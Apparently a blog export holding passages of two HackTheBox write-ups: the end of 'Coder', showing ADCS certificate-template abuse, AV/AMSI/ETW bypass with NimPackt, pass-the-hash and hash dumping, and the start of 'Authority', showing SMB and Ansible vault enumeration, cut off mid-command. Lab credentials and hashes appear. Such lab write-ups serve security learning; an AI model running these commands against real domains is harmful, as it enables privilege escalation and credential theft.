C:\\Users\\e.black\\Documents\u0026gt; certutil -dump Entry 0: (Local) Name: \u0026#34;coder-DC01-CA\u0026#34; ---snip--- ---snip--- Since, AMSI and ETW is active on the machine, I decided to enumerate vulnerable ADCS templates using certipy remotely. However, I couldn\u0026rsquo;t find any.\n❯ certipy find -vulnerable -stdout -u e.black@coder.htb -p \u0026#39;ypOSJXPqlDOxxbQSfEERy300\u0026#39; -dc-ip 10.129.229.190 Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 34 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 12 enabled certificate templates [*] Trying to get CA configuration for \u0026#39;coder-DC01-CA\u0026#39; via CSRA [!] Got error while trying to get CA configuration for \u0026#39;coder-DC01-CA\u0026#39; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error. [*] Trying to get CA configuration for \u0026#39;coder-DC01-CA\u0026#39; via RRP [!] Failed to connect to remote registry. Service should be starting now. Trying again... [*] Got CA configuration for \u0026#39;coder-DC01-CA\u0026#39; [*] Enumeration output: Certificate Authorities 0 CA Name : coder-DC01-CA DNS Name : dc01.coder.htb Certificate Subject : CN=coder-DC01-CA, DC=coder, DC=htb Certificate Serial Number : 2180F0D10CFECB9840260D0730724BDF Certificate Validity Start : 2022-06-29 03:51:44+00:00 Certificate Validity End : 2052-06-29 04:01:44+00:00 Web Enrollment : Disabled User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Permissions Owner : CODER.HTB\\Administrators Access Rights ManageCertificates : CODER.HTB\\Administrators CODER.HTB\\Domain Admins CODER.HTB\\Enterprise Admins ManageCa : CODER.HTB\\Administrators CODER.HTB\\Domain Admins CODER.HTB\\Enterprise Admins Enroll : CODER.HTB\\Authenticated Users Certificate Templates : [!] Could not find any certificate templates AV Bypass #As a side note I was able to bypass AV using NimPackt.\n❯ docker run --rm -v `pwd`:/usr/src/np -w /usr/src/np chvancooten/nimbuild python3 NimPackt.py -e execute-assembly -i Certify.exe -S -v WARNING: Shinject arguments (-r, -t, -E) will be ignored in \u0026#39;execute-assembly\u0026#39; mode. Encrypting binary to embed... Prepared Nim source file. Cross-compiling Nim binary for Windows (this may take a while)... Compiled Nim binary to output/CertifyExecAssemblyNimPackt.exe! SHA1 hash of file to use as IOC: e85a9914d89f31e36eefe62e19802ea5c79182b8 Go forth and make a Nimpackt that matters 😎 *Evil-WinRM* PS C:\\Users\\e.black\\Documents\u0026gt; .\\CertifyExecAssemblyNimPackt.exe find /vulnerable NimPackt [*] AMSI disabled: true [*] ETW disabled: true [*] Executing shellycoat in local thread to unhook NTDLL... [*] NtAllocateVirtualMemory: 0 [*] NtWriteVirtualMemory: 0 \\-- bytes written: 12287 [*] Executing assembly... _____ _ _ __ / ____| | | (_)/ _| | | ___ _ __| |_ _| |_ _ _ | | / _ \\ \u0026#39;__| __| | _| | | | | |___| __/ | | |_| | | | |_| | \\_____\\___|_| \\__|_|_| \\__, | __/ | |___./ v1.0.0 ---snip--- ---snip--- [+] No Vulnerable Certificates Templates found! Abusing PKI Admins #I wasn\u0026rsquo;t able to find any attack vectors here for a while, after looking at HackTheBox forums, I realized that, being a member of the PKI Admins, I have the permissions to manage and add templates. There\u0026rsquo;s no reason why the added template couldn\u0026rsquo;t be a vulnerable one that I can exploit.\nAfter some google-fu I found GoateePFE/ADCSTemplate which can be used to easily manipulate certificates.\nInitially, I tried\nExporting two templates (SubCA and User) that when combined give me everything to exploit ESC1 However it seems the newly created template wasn\u0026rsquo;t supported by the CA At first, I tried exporting two templates (SubCA and User) to combine their properties for ESC1 exploitation. However, it turned out the newly created template wasn\u0026rsquo;t supported by the CA.\n*Evil-WinRM* PS C:\\Users\\e.black\\Documents\u0026gt; Export-ADCSTemplate -displayname \u0026#34;SubCA\u0026#34; \u0026gt; .\\subca.json *Evil-WinRM* PS C:\\Users\\e.black\\Documents\u0026gt; Export-ADCSTemplate -displayname \u0026#34;User\u0026#34; \u0026gt; .\\DU_perms.json *Evil-WinRM* PS C:\\Users\\e.black\\Documents\u0026gt; upload vuln.json *Evil-WinRM* PS C:\\Users\\e.black\\Documents\u0026gt; New-ADCSTemplate -DisplayName VulnTemplate -JSON (Get-Content .\\vuln.json -Raw) -Identity \u0026#34;CODER.HTB\\PKI Admins\u0026#34; -AutoEnroll -Publish *Evil-WinRM* PS C:\\Users\\e.black\\Documents\u0026gt; certutil -CATemplates VulnTemplate: VulnTemplate -- Auto-Enroll: Access is denied. ---snip--- ---Certipy-Output--- ---snip-- [!] Vulnerabilities ESC1 : \u0026#39;CODER.HTB\\\\PKI Admins\u0026#39; can enroll, enrollee supplies subject and template ❯ certipy req \\ -u \u0026#39;e.black\u0026#39; -p \u0026#39;ypOSJXPqlDOxxbQSfEERy300\u0026#39; \\ -ca \u0026#39;coder-DC01-CA\u0026#39; -target coder.htb \\ -upn Administrator@coder.htb -dns dc01.coder.htb -dc-ip 10.129.229.190 \\ -template VulnTemplate Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [-] Got error while trying to request certificate: code: 0x80094800 - CERTSRV_E_UNSUPPORTED_CERT_TYPE - The requested certificate template is not supported by this CA. [*] Request ID is 15 Would you like to save the private key? (y/N) y [*] Saved private key to 15.key [-] Failed to request certificate I later realized that by having EnrolleeSuppliesSubject with SubCA, the New-ADCSTemplate parameters allowed me to manage additional permissions for the template:\n-Identity is utilized for permissioning the template. -AutoEnroll is employed to grant AutoEnroll to the specified identity. This alone gives me access to a bunch of ADCS vulnerabilities.\n*Evil-WinRM* PS C:\\Users\\e.black\\Documents\u0026gt; New-ADCSTemplate -DisplayName Abraxas -JSON (Export-ADCSTemplate -DisplayName \u0026#34;Subordinate Certification Authority\u0026#34;) -publish -Identity \u0026#34;CODER.HTB\\PKI Admins\u0026#34; *Evil-WinRM* PS C:\\Users\\e.black\\Documents\u0026gt; certutil -CATemplates Abraxas: Abraxas -- Auto-Enroll: Access is denied. ---snip--- According the certipy, the newly added template is vulnerable to ESC1, ESC2, ESC3, ESC4.\n❯ certipy find -vulnerable -stdout -u e.black@coder.htb -p \u0026#39;ypOSJXPqlDOxxbQSfEERy300\u0026#39; -dc-ip 10.129.229.190 Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 35 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 13 enabled certificate templates [*] Trying to get CA configuration for \u0026#39;coder-DC01-CA\u0026#39; via CSRA [!] Got error while trying to get CA configuration for \u0026#39;coder-DC01-CA\u0026#39; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error. [*] Trying to get CA configuration for \u0026#39;coder-DC01-CA\u0026#39; via RRP [!] Failed to connect to remote registry. Service should be starting now. Trying again... [*] Got CA configuration for \u0026#39;coder-DC01-CA\u0026#39; [*] Enumeration output: Certificate Authorities 0 CA Name : coder-DC01-CA DNS Name : dc01.coder.htb Certificate Subject : CN=coder-DC01-CA, DC=coder, DC=htb Certificate Serial Number : 2180F0D10CFECB9840260D0730724BDF Certificate Validity Start : 2022-06-29 03:51:44+00:00 Certificate Validity End : 2052-06-29 04:01:44+00:00 Web Enrollment : Disabled User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Permissions Owner : CODER.HTB\\Administrators Access Rights ManageCertificates : CODER.HTB\\Administrators CODER.HTB\\Domain Admins CODER.HTB\\Enterprise Admins ManageCa : CODER.HTB\\Administrators CODER.HTB\\Domain Admins CODER.HTB\\Enterprise Admins Enroll : CODER.HTB\\Authenticated Users Certificate Templates 0 Template Name : Abraxas Display Name : Abraxas Certificate Authorities : coder-DC01-CA Enabled : True Client Authentication : True Enrollment Agent : True Any Purpose : True Enrollee Supplies Subject : True Certificate Name Flag : EnrolleeSuppliesSubject Enrollment Flag : None Private Key Flag : ExportableKey Requires Manager Approval : False Requires Key Archival : False Authorized Signatures Required : 0 Validity Period : 5 years Renewal Period : 6 weeks Minimum RSA Key Length : 2048 Permissions Enrollment Permissions Enrollment Rights : CODER.HTB\\PKI Admins Object Control Permissions Owner : CODER.HTB\\Erron Black Full Control Principals : CODER.HTB\\Domain Admins CODER.HTB\\Local System CODER.HTB\\Enterprise Admins Write Owner Principals : CODER.HTB\\Domain Admins CODER.HTB\\Local System CODER.HTB\\Enterprise Admins Write Dacl Principals : CODER.HTB\\Domain Admins CODER.HTB\\Local System CODER.HTB\\Enterprise Admins Write Property Principals : CODER.HTB\\Domain Admins CODER.HTB\\Local System CODER.HTB\\Enterprise Admins [!] Vulnerabilities ESC1 : \u0026#39;CODER.HTB\\\\PKI Admins\u0026#39; can enroll, enrollee supplies subject and template allows client authentication ESC2 : \u0026#39;CODER.HTB\\\\PKI Admins\u0026#39; can enroll and template can be used for any purpose ESC3 : \u0026#39;CODER.HTB\\\\PKI Admins\u0026#39; can enroll and template has Certificate Request Agent EKU set ESC4 : Template is owned by CODER.HTB\\Erron Black I can now abuse the ESC1 vulnerability to request a certificate for Administrator. I have a decent explanation of the ESC1 vulnerability in the HTB Authority writeup\n❯ certipy req \\ -u \u0026#39;e.black\u0026#39; -p \u0026#39;ypOSJXPqlDOxxbQSfEERy300\u0026#39; \\ -ca \u0026#39;coder-DC01-CA\u0026#39; -target coder.htb \\ -upn Administrator@coder.htb -dns dc01.coder.htb -dc-ip 10.129.229.190 \\ -template Abraxas Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [*] Successfully requested certificate [*] Request ID is 17 [*] Got certificate with multiple identifications UPN: \u0026#39;Administrator@coder.htb\u0026#39; DNS Host Name: \u0026#39;dc01.coder.htb\u0026#39; [*] Certificate has no object SID [*] Saved certificate and private key to \u0026#39;administrator_dc01.pfx\u0026#39; Using certipy again, I can use the obtained certificate to get the hash for Administrator.\n❯ _ ntpdate 10.129.229.190 [sudo] password for kali: 2023-12-15 03:53:33.525549 (+0530) +20092.093889 +/- 0.047332 10.129.229.190 s1 no-leap CLOCK: time stepped by 20092.093889 ❯ certipy auth -pfx administrator_dc01.pfx Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Found multiple identifications in certificate [*] Please select one: [0] UPN: \u0026#39;Administrator@coder.htb\u0026#39; [1] DNS Host Name: \u0026#39;dc01.coder.htb\u0026#39; \u0026gt; 0 [*] Using principal: administrator@coder.htb [*] Trying to get TGT... [*] Got TGT [*] Saved credential cache to \u0026#39;administrator.ccache\u0026#39; [*] Trying to retrieve NT hash for \u0026#39;administrator\u0026#39; [*] Got hash for \u0026#39;administrator@coder.htb\u0026#39;: aad3b435b51404eeaad3b435b51404ee:807726fcf9f188adc26eeafd7dc16bb7 I can use the hash to login as Administrator via evil-winrm.\n❯ evil-winrm -i 10.129.229.190 -u \u0026#39;Administrator\u0026#39; -H 807726fcf9f188adc26eeafd7dc16bb7 Evil-WinRM shell v3.5 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; whoami coder\\administrator Alternatively, I can also use secretsdump.py from Impacket to dump hashes for all other users.\n❯ secretsdump.py \u0026#39;coder.htb/Administrator\u0026#39;@coder.htb -outputfile hashes -hashes \u0026#39;:807726fcf9f188adc26eeafd7dc16bb7\u0026#39; Impacket for Exegol - v0.10.1.dev1+20230909.241.3001b26 - Copyright 2022 Fortra - forked by ThePorgs [*] Service RemoteRegistry is in stopped state [*] Starting service RemoteRegistry [*] Target system bootKey: 0x14fde48e78a860a3522e88d90440ae18 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:88c80d0cbc1a15acec2a8d26a259b623::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: ---snip--- ---snip--- Pwned!!\nRelated Links # ilspy-vscode - Visual Studio Marketplace RijndaelManaged Class (System.Security.Cryptography) | Microsoft Learn Running Personal Build | TeamCity On-Premises Documentation Windows Obfuscated Reverse Shells Super User Access | TeamCity On-Premises Documentation PowerShell – Encrypt and Decrypt using SecureString – Lab Core | The Lab of MrNetTek ConvertTo-SecureString (Microsoft.PowerShell.Security) - PowerShell | Microsoft Learn PowerShell: Decrypt a Secure String – SID-500.COM chvancooten/NimPackt-v1: Nim-based assembly packer and shellcode loader for opsec \u0026amp; profit GoateePFE/ADCSTemplate: A PowerShell module for exporting, importing, removing, permissioning, publishing Active Directory Certificate Templates. It also includes a DSC resource for creating AD CS templates using these functions. This was built with the intent of using DSC for rapid lab builds. Could also work in production to move templates between AD CS environments. ","date":"17 December 2023","permalink":"/blog/htb-coder/","section":"Blog Posts","summary":"Coder is an Insane Windows box. I start by decompiling a C# executable used for encryption. Leveraging a deprecated encryption algorithm, I successfully decrypt an encrypted archive containing a KeePass database and key. With the key, I can access the database, revealing credentials for a TeamCity instance and a 2FA backup code. After brute-forcing the 2FA code, I gain access to TeamCity, allowing me to upload a diff to execute commands in a CI/CD pipeline. Escalating to Super User, I find past builds and uncover two new files. Using command execution from the pipeline, I identify a diff containing encrypted PowerShell credentials. Decrypting these credentials grants access to the account of E.Black, who is part of the PKI Admins group. Utilizing this privilege, I upload a vulnerable template and exploit the ECS1 vulnerability to obtain an Administrator certificate.","title":"HTB Coder"},{"content":"","date":null,"permalink":"/tags/htb-insane/","section":"Tags","summary":"","title":"Htb-Insane"},{"content":"","date":null,"permalink":"/tags/ilspy/","section":"Tags","summary":"","title":"Ilspy"},{"content":"","date":null,"permalink":"/tags/keepass/","section":"Tags","summary":"","title":"Keepass"},{"content":"","date":null,"permalink":"/tags/nxc/","section":"Tags","summary":"","title":"Nxc"},{"content":"","date":null,"permalink":"/tags/personal-builds/","section":"Tags","summary":"","title":"Personal-Builds"},{"content":"","date":null,"permalink":"/tags/pki-admins/","section":"Tags","summary":"","title":"PKI-Admins"},{"content":"","date":null,"permalink":"/tags/pwsh-creds-decrypt/","section":"Tags","summary":"","title":"Pwsh-Creds-Decrypt"},{"content":"","date":null,"permalink":"/tags/rijndaelmanaged/","section":"Tags","summary":"","title":"RijndaelManaged"},{"content":"","date":null,"permalink":"/tags/smb/","section":"Tags","summary":"","title":"SMB"},{"content":"","date":null,"permalink":"/tags/teamcity/","section":"Tags","summary":"","title":"Teamcity"},{"content":"","date":null,"permalink":"/categories/windows/","section":"Categories","summary":"","title":"Windows"},{"content":"","date":null,"permalink":"/tags/ad/","section":"Tags","summary":"","title":"AD"},{"content":"","date":null,"permalink":"/tags/ansible-vault/","section":"Tags","summary":"","title":"Ansible-Vault"},{"content":"Overview # Authority is a medium Windows AD box. I discovered Ansible playbooks in a publicly accessible share, containing encrypted variables that, once cracked, provided credentials for the PWM configuration manager. With PWM in config mode, I could make changes without authentication, allowing the capture of clear text LDAP credentials for subsequent WinRM authentication. I also discovered ADCS and a vulnerable certificate template (ESC1). Although I successfully exploited the vulnerability, Kerberos limitations prevented authentication with the generated certificate. To bypass this I used the \u0026ldquo;pass-the-cert\u0026rdquo; attack to gain access as Administrator.\nEnumeration # Open Ports #Found a bunch of open ports using nmap\nport 53 → DNS port 80 → IIS Web server port 88 → Kerberos port 135 → MS RPC port 139, 445 → SMB port 636, 3269 → LDAP over SSL port 5985, 47001 → wsman and winrm port 8443 → HTTPS The script scan of LDAP ports leaks the domains authority.htb and authority.htb.corp. Furthermore, the HTTPS site on port 8443 might be within a Docker container, as its SSL certificate\u0026rsquo;s common name is set to 172.16.2.118.\n#nmap -p53,88,135,139,80,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49667,49666,49671,49684,49688,49664,49665,49685,49687,49699,49697,49711,58545 -sV -sC -T4 -Pn -oA 10.10.11.222 10.10.11.222 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-05 02:01 IST Nmap scan report for 10.10.11.222 Host is up (0.062s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Server 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-08-05 00:31:08Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB | Not valid before: 2022-08-09T23:03:21 |_Not valid after: 2024-08-09T23:13:21 |_ssl-date: 2023-08-05T00:32:07+00:00; +3h59m59s from scanner time. 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB | Not valid before: 2022-08-09T23:03:21 |_Not valid after: 2024-08-09T23:13:21 |_ssl-date: 2023-08-05T00:32:07+00:00; +3h59m59s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) |_ssl-date: 2023-08-05T00:32:07+00:00; +3h59m59s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB | Not valid before: 2022-08-09T23:03:21 |_Not valid after: 2024-08-09T23:13:21 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB | Not valid before: 2022-08-09T23:03:21 |_Not valid after: 2024-08-09T23:13:21 |_ssl-date: 2023-08-05T00:32:07+00:00; +3h59m59s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 8443/tcp open ssl/https-alt |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=172.16.2.118 | Not valid before: 2023-08-02T09:54:30 |_Not valid after: 2025-08-03T21:32:54 |_http-title: Site doesnt have a title (text/html;charset=ISO-8859-1). | fingerprint-strings: | FourOhFourRequest, GetRequest: | HTTP/1.1 200 | Content-Type: text/html;charset=ISO-8859-1 | Content-Length: 82 | Date: Sat, 05 Aug 2023 00:31:14 GMT | Connection: close | \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;meta http-equiv=\u0026#34;refresh\u0026#34; content=\u0026#34;0;URL=\u0026#39;/pwm\u0026#39;\u0026#34;/\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;/html\u0026gt; | HTTPOptions: | HTTP/1.1 200 | Allow: GET, HEAD, POST, OPTIONS | Content-Length: 0 | Date: Sat, 05 Aug 2023 00:31:14 GMT | Connection: close | RTSPRequest: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 1936 | Date: Sat, 05 Aug 2023 00:31:20 GMT | Connection: close | \u0026lt;!doctype html\u0026gt;\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP Status 400 | Request\u0026lt;/title\u0026gt;\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;HTTP Status 400 |_ Request\u0026lt;/h1\u0026gt;\u0026lt;hr class=\u0026#34;line\u0026#34; /\u0026gt;\u0026lt;p\u0026gt;\u0026lt;b\u0026gt;Type\u0026lt;/b\u0026gt; Exception Report\u0026lt;/p\u0026gt;\u0026lt;p\u0026gt;\u0026lt;b\u0026gt;Message\u0026lt;/b\u0026gt; Invalid character found in the HTTP protocol [RTSP\u0026amp;#47;1.00x0d0x0a0x0d0x0a...]\u0026lt;/p\u0026gt;\u0026lt;p\u0026gt;\u0026lt;b\u0026gt;Description\u0026lt;/b\u0026gt; The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49684/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49685/tcp open msrpc Microsoft Windows RPC 49687/tcp open msrpc Microsoft Windows RPC 49688/tcp open msrpc Microsoft Windows RPC 49697/tcp open msrpc Microsoft Windows RPC 49699/tcp open msrpc Microsoft Windows RPC 49711/tcp open msrpc Microsoft Windows RPC 58545/tcp open msrpc Microsoft Windows RPC port 53 - DNS #DNS resolution maps both domains from nmap. However, since zone transfer failed, no other significant information from DNS\n❯ dig +noall +answer authority.htb @10.129.216.215 authority.htb. 600 IN A 10.129.216.215 authority.htb. 600 IN A 10.129.229.30 authority.htb. 600 IN A 10.129.229.56 ❯ dig +noall +answer authority.htb.corp @10.129.216.215 authority.htb.corp. 1200 IN A 10.129.216.215 ❯ dig axfr @10.10.11.222 authority.htb ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.16-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr @10.10.11.222 authority.htb ; (1 server found) ;; global options: +cmd ; Transfer failed. port 445 - SMB #SMB has anonymous login enabled, with which I have read access to the Development share.\n❯ nxc smb 10.10.11.222 -u \u0026#39;guest\u0026#39; -p \u0026#39;\u0026#39; SMB 10.10.11.222 445 AUTHORITY [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) SMB 10.10.11.222 445 AUTHORITY [+] authority.htb\\guest: ❯ nxc smb 10.10.11.222 -u \u0026#39;guest\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 10.10.11.222 445 AUTHORITY [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) SMB 10.10.11.222 445 AUTHORITY [+] authority.htb\\guest: SMB 10.10.11.222 445 AUTHORITY [*] Enumerated shares SMB 10.10.11.222 445 AUTHORITY Share Permissions Remark SMB 10.10.11.222 445 AUTHORITY ----- ----------- ------ SMB 10.10.11.222 445 AUTHORITY ADMIN$ Remote Admin SMB 10.10.11.222 445 AUTHORITY C$ Default share SMB 10.10.11.222 445 AUTHORITY Department Shares SMB 10.10.11.222 445 AUTHORITY Development READ SMB 10.10.11.222 445 AUTHORITY IPC$ READ Remote IPC SMB 10.10.11.222 445 AUTHORITY NETLOGON Logon server share SMB 10.10.11.222 445 AUTHORITY SYSVOL Logon server share With NetExec\u0026rsquo;s SMB spider plus module, I was able to spider the readable shares and download relevant files.\n❯ nxc smb 10.10.11.222 -u \u0026#39;guest\u0026#39; -p \u0026#39;\u0026#39; -M spider_plus -o DOWNLOAD_FLAG=true SMB 10.10.11.222 445 AUTHORITY [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) SMB 10.10.11.222 445 AUTHORITY [+] authority.htb\\guest: SPIDER_P... 10.10.11.222 445 AUTHORITY [*] Started module spidering_plus with the following options: SPIDER_P... 10.10.11.222 445 AUTHORITY [*] DOWNLOAD_FLAG: True SPIDER_P... 10.10.11.222 445 AUTHORITY [*] STATS_FLAG: True SPIDER_P... 10.10.11.222 445 AUTHORITY [*] EXCLUDE_FILTER: [\u0026#39;print$\u0026#39;, \u0026#39;ipc$\u0026#39;] SPIDER_P... 10.10.11.222 445 AUTHORITY [*] EXCLUDE_EXTS: [\u0026#39;ico\u0026#39;, \u0026#39;lnk\u0026#39;] SPIDER_P... 10.10.11.222 445 AUTHORITY [*] MAX_FILE_SIZE: 50 KB SPIDER_P... 10.10.11.222 445 AUTHORITY [*] OUTPUT_FOLDER: /tmp/nxc_spider_plus SPIDER_P... 10.10.11.222 445 AUTHORITY [+] Saved share-file metadata to \u0026#34;/tmp/nxc_spider_plus/10.10.11.222.json\u0026#34;. SPIDER_P... 10.10.11.222 445 AUTHORITY [*] SMB Shares: 7 (ADMIN$, C$, Department Shares, Development, IPC$, NETLOGON, SYSVOL) SPIDER_P... 10.10.11.222 445 AUTHORITY [*] SMB Readable Shares: 2 (Development, IPC$) SPIDER_P... 10.10.11.222 445 AUTHORITY [*] SMB Filtered Shares: 1 SPIDER_P... 10.10.11.222 445 AUTHORITY [*] Total folders found: 27 SPIDER_P... 10.10.11.222 445 AUTHORITY [*] Total files found: 52 SPIDER_P... 10.10.11.222 445 AUTHORITY [*] File size average: 1.5 KB SPIDER_P... 10.10.11.222 445 AUTHORITY [*] File size min: 4 B SPIDER_P... 10.10.11.222 445 AUTHORITY [*] File size max: 11.1 KB SPIDER_P... 10.10.11.222 445 AUTHORITY [*] File unique exts: 6 (.txt, .md, .yml, .j2, .cfg, .ini) SPIDER_P... 10.10.11.222 445 AUTHORITY [*] Downloads successful: 52 SPIDER_P... 10.10.11.222 445 AUTHORITY [+] All files processed successfully. Going through the findings, I discovered what looks like ansible playbooks in the Development\\Automation\\Ansible subdirectory.\n❯ l /tmp/nxc_spider_plus/10.10.11.222/Development/Automation/Ansible Permissions Size User Date Modified Name drwxr-xr-x - abraxas 30 Nov 18:07 ADCS drwxr-xr-x - abraxas 30 Nov 18:07 LDAP drwxr-xr-x - abraxas 30 Nov 18:07 PWM drwxr-xr-x - abraxas 30 Nov 18:07 SHARE ❯ cat /tmp/nxc_spider_plus/10.10.11.222.json | \\ jq -r \u0026#39;.Development | keys_unsorted[]\u0026#39; | \\ awk -F \u0026#39;/\u0026#39; \u0026#39;{sub($1 FS $2 FS, \u0026#34;\u0026#34;); print}\u0026#39; ADCS/.ansible-lint ADCS/.yamllint ...snip... ADCS/tasks/assert.yml ADCS/tasks/generate_ca_certs.yml ADCS/tasks/init_ca.yml ADCS/tasks/main.yml ADCS/tasks/requests.yml ...snip... LDAP/handlers/main.yml LDAP/meta/main.yml LDAP/tasks/main.yml ...snip... PWM/README.md PWM/ansible.cfg PWM/ansible_inventory PWM/defaults/main.yml PWM/handlers/main.yml PWM/meta/main.yml PWM/tasks/main.yml PWM/templates/context.xml.j2 PWM/templates/tomcat-users.xml.j2 SHARE/tasks/main.yml In the PWM subdirectory, I came across intriguing files, including inventory, configuration, variables, and ansible tasks.\n├── PWM │ ├── ansible.cfg │ ├── ansible_inventory │ ├── defaults │ │ └── main.yml │ ├── handlers │ │ └── main.yml │ ├── meta │ │ └── main.yml │ ├── README.md │ ├── tasks │ │ └── main.yml │ └── templates │ ├── context.xml.j2 │ └── tomcat-users.xml.j2 └── SHARE └── tasks └── main.yml I found WinRM credentials in the inventory file. Unfortunately, the creds don\u0026rsquo;t work.\n❯ cat PWM/ansible_inventory ansible_user: administrator ansible_password: Welcome1 ansible_port: 5985 ansible_connection: winrm ansible_winrm_transport: ntlm ansible_winrm_server_cert_validation: ignore ❯ nxc winrm 10.10.11.222 -u \u0026#39;administrator\u0026#39; -p \u0026#39;Welcome1\u0026#39; WINRM 10.10.11.222 5985 AUTHORITY [*] Windows 10.0 Build 17763 (name:AUTHORITY) (domain:authority.htb) WINRM 10.10.11.222 5985 AUTHORITY [-] authority.htb\\administrator:Welcome1 Within the defaults/main.yml file, I found a few variables encrypted using ansible-vault. These encrypted variables, particularly within the default directory, could be interesting.\ndefaults/main.yml\n--- pwm_run_dir: \u0026#34;{{ lookup(\u0026#39;env\u0026#39;, \u0026#39;PWD\u0026#39;) }}\u0026#34; pwm_hostname: authority.htb.corp pwm_http_port: \u0026#34;{{ http_port }}\u0026#34; pwm_https_port: \u0026#34;{{ https_port }}\u0026#34; pwm_https_enable: true pwm_require_ssl: false pwm_admin_login: !vault | $ANSIBLE_VAULT;1.1;AES256 32666534386435366537653136663731633138616264323230383566333966346662313161326239 6134353663663462373265633832356663356239383039640a346431373431666433343434366139 35653634376333666234613466396534343030656165396464323564373334616262613439343033 6334326263326364380a653034313733326639323433626130343834663538326439636232306531 3438 pwm_admin_password: !vault | $ANSIBLE_VAULT;1.1;AES256 31356338343963323063373435363261323563393235633365356134616261666433393263373736 3335616263326464633832376261306131303337653964350a363663623132353136346631396662 38656432323830393339336231373637303535613636646561653637386634613862316638353530 3930356637306461350a316466663037303037653761323565343338653934646533663365363035 6531 ldap_uri: ldap://127.0.0.1/ ldap_base_dn: \u0026#34;DC=authority,DC=htb\u0026#34; ldap_admin_password: !vault | $ANSIBLE_VAULT;1.1;AES256 63303831303534303266356462373731393561313363313038376166336536666232626461653630 3437333035366235613437373733316635313530326639330a643034623530623439616136363563 34646237336164356438383034623462323531316333623135383134656263663266653938333334 3238343230333633350a646664396565633037333431626163306531336336326665316430613566 3764 I can crack the encrypted variables by generating a hash with the ansible2john script and then crack it using JohnTheRipper.\nThe script requires that the hash start with $ANSIBLE_VAULT. So I saved one of the variables in a variable.yml file\n❯ ansible2john variable.yml 